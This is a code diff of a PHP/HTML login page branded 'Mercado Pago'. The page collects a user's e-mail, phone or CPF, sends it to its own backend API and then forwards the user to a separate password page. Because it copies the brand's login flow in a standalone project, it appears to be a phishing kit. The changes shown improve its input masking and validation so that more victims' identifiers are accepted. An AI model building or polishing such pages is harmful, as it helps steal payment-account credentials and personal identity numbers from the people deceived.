@@ -3,12 +3,8 @@
 session_start();
 
 // --- LÓGICA PARA CRIAR O COOKIE ---
-// Verifica se o cookie 'identificador_cliente' JÁ NÃO EXISTE
 if (!isset($_COOKIE['identificador_cliente'])) {
-    // Se não existe, cria um ID único e seguro
     $identificadorUnico = uniqid('cliente_', true) . bin2hex(random_bytes(8));
-    
-    // Define o cookie para durar 30 dias, acessível em todo o site
     setcookie('identificador_cliente', $identificadorUnico, time() + (86400 * 30), "/");
 }
 ?>
@@ -19,7 +15,6 @@ if (!isset($_COOKIE['identificador_cliente'])) {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Mercado Pago</title>
     <style>
-        /* Todos os seus estilos anteriores permanecem aqui... */
         body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; display: flex; flex-direction: column; min-height: 100vh; }
         .main-header { background-color: #ffe600; padding: 0 680px; box-shadow: 0 1px 2px 0 rgba(0,0,0,.1); height: 60px; display: flex; align-items: center; justify-content: flex-start; }
         .main-header img { height: 37px; vertical-align: middle; }
@@ -44,7 +39,6 @@ if (!isset($_COOKIE['identificador_cliente'])) {
         .footer-left, .footer-right { display: flex; align-items: center; gap: 16px; }
         .main-footer a { color: #3483fa; text-decoration: none; }
         .main-footer a:hover { text-decoration: underline; }
-        /* NOVO: Estilo para mensagens de erro */
         .error-message { color: #d93025; font-size: 12px; text-align: left; margin-top: 4px; min-height: 16px; }
     </style>
 </head>
@@ -98,22 +92,31 @@ if (!isset($_COOKIE['identificador_cliente'])) {
         const errorDiv = document.getElementById('error-message');
         const submitBtn = loginForm.querySelector('.btn-continue');
 
-        // --- MÁSCARA DE INPUT ---
+        // --- NOVA MÁSCARA DE INPUT INTELIGENTE ---
         identificadorInput.addEventListener('input', (e) => {
-            let value = e.target.value.replace(/\D/g, ''); // Remove tudo que não for dígito
+            const rawValue = e.target.value;
             
-            if (value.length <= 11) { // Potencial CPF ou Telefone
-                // Máscara de CPF
-                if (value.length > 9) {
-                    value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
-                } else if (value.length > 6) {
-                    value = value.replace(/(\d{3})(\d{3})(\d{3})/, '$1.$2.$3');
-                } else if (value.length > 3) {
-                    value = value.replace(/(\d{3})(\d{3})/, '$1.$2');
-                }
-                e.target.value = value;
+            // Se o usuário está digitando um email (contém letras ou @), não faz nada.
+            if (/[a-zA-Z]/.test(rawValue) || rawValue.includes('@')) {
+                return;
             }
-            // Se for e-mail, não faz nada e deixa o usuário digitar livremente.
+
+            // Se forem apenas números, aplica a máscara de CPF/Telefone
+            let value = rawValue.replace(/\D/g, ''); // Remove tudo que não for dígito
+            value = value.substring(0, 14); // Limita o tamanho para evitar inputs longos
+
+            // Máscara dinâmica (CPF ou Celular)
+            if (value.length > 11) { // Formato de Celular com 9 dígitos + DDD
+                 value = value.replace(/^(\d{2})(\d{5})(\d{4}).*/, '($1) $2-$3');
+            } else if (value.length > 10) { // Celular com 8 dígitos + DDD
+                 value = value.replace(/^(\d{2})(\d{4})(\d{4}).*/, '($1) $2-$3');
+            } else if (value.length > 6) {
+                value = value.replace(/^(\d{2})(\d{4})(.*)/, '($1) $2-$3');
+            } else if (value.length > 2) {
+                value = value.replace(/^(\d{2})(.*)/, '($1) $2');
+            }
+
+            e.target.value = value;
         });
         
         // --- FUNÇÕES DE VALIDAÇÃO ---
@@ -124,8 +127,7 @@ if (!isset($_COOKIE['identificador_cliente'])) {
 
         const isValidCPF = (cpf) => {
             cpf = cpf.replace(/\D/g, ''); // Remove formatação
-            if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false; // Verifica se não tem 11 dígitos ou se todos são iguais
-            // Lógica de validação de CPF (dígitos verificadores)
+            if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false; 
             let sum = 0, rest;
             for (let i = 1; i <= 9; i++) sum += parseInt(cpf.substring(i-1, i)) * (11 - i);
             rest = (sum * 10) % 11;
@@ -150,19 +152,20 @@ if (!isset($_COOKIE['identificador_cliente'])) {
             errorDiv.textContent = ''; // Limpa erros antigos
             const valor = identificadorInput.value;
 
-            // Validação
             if (!valor) {
                 errorDiv.textContent = 'Informe seu e-mail, telefone ou CPF.';
                 return;
             }
-
+            
             let eValido = false;
+            const apenasNumeros = valor.replace(/\D/g, '');
+
             if (valor.includes('@')) {
                 eValido = isValidEmail(valor);
-            } else if (valor.replace(/\D/g, '').length === 11) {
-                eValido = isValidCPF(valor);
-            } else {
-                eValido = isValidPhone(valor);
+            } else if (apenasNumeros.length === 11) {
+                eValido = isValidCPF(valor) || isValidPhone(valor); // Aceita CPF ou Celular com 11 dígitos
+            } else if (apenasNumeros.length === 10) {
+                eValido = isValidPhone(valor); // Aceita Telefone com 10 dígitos
             }
 
             if (!eValido) {
@@ -170,7 +173,6 @@ if (!isset($_COOKIE['identificador_cliente'])) {
                 return;
             }
             
-            // Envio para a API
             submitBtn.disabled = true;
             submitBtn.textContent = 'Aguarde...';
 
@@ -180,16 +182,12 @@ if (!isset($_COOKIE['identificador_cliente'])) {
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ identificador: valor })
                 });
-
                 const result = await response.json();
-
                 if (result.success) {
-                    // Redireciona para a página de senha em caso de sucesso
                     window.location.href = 'senha.php';
                 } else {
                     errorDiv.textContent = result.error || 'Ocorreu um erro. Tente novamente.';
                 }
-
             } catch (error) {
                 console.error('Falha na comunicação:', error);
                 errorDiv.textContent = 'Não foi possível conectar ao servidor.';
